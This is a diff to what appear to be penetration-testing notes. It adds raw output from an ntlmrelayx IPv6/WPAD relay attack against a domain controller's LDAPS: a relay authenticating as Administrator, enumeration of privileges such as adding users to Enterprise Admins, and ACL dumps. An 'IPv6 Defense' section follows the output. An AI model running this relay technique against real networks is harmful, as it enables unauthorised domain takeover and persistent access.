@@ -153,6 +153,220 @@ ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
 ```
 all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
 
+```
+TypeName: {'ACCESS_ALLOWED_ACE'}
+[*] User privileges found: Create user
+[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
+[*] User privileges found: Modifying domain ACL
+[-] New user already added. Refusing to add another
+[-] Unable to escalate without a valid user.
+[-] New user already added. Refusing to add another
+[-] Unable to escalate without a valid user, aborting.
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
+[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
+[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
+[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
+[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: cdn.onenote.net:443
+[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: cdn.onenote.net:443
+[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
+[*] HTTPD: Client requested path: cdn.onenote.net:443
+[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
+[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
+[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+
+ACE
+AceType: {0}
+AceFlags: {0}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
+    }
+}
+TypeName: {'ACCESS_ALLOWED_ACE'}
+
+ACE
+AceType: {0}
+AceFlags: {18}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
+    }
+}
+TypeName: {'ACCESS_ALLOWED_ACE'}
+
+ACE
+AceType: {0}
+AceFlags: {18}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
+    }
+}
+TypeName: {'ACCESS_ALLOWED_ACE'}
+[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: login.live.com:443
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
+[*] HTTPD: Client requested path: login.live.com:443
+
+ACE
+AceType: {0}
+AceFlags: {2}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
+    }
+}
+TypeName: {'ACCESS_ALLOWED_ACE'}
+
+ACE
+AceType: {0}
+AceFlags: {18}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
+    }
+}
+TypeName: {'ACCESS_ALLOWED_ACE'}
+
+ACE
+AceType: {0}
+AceFlags: {0}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
+    }
+}
+TypeName: {'ACCESS_ALLOWED_ACE'}
+
+ACE
+AceType: {0}
+AceFlags: {18}
+AceSize: {36}
+AceLen: {32}
+
+Ace:{
+
+    Mask:{
+        Mask: {983551}
+    }
+
+    Sid:{
+        Revision: {1}
+        SubAuthorityCount: {5}
+
+        IdentifierAuthority:{
+            Value: {b'\x00\x00\x00\x00\x00\x05'}
+        }
+        SubLen: {20}
+        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
+    }
+}
+
+```
 ## IPv6 Defense:
 
 
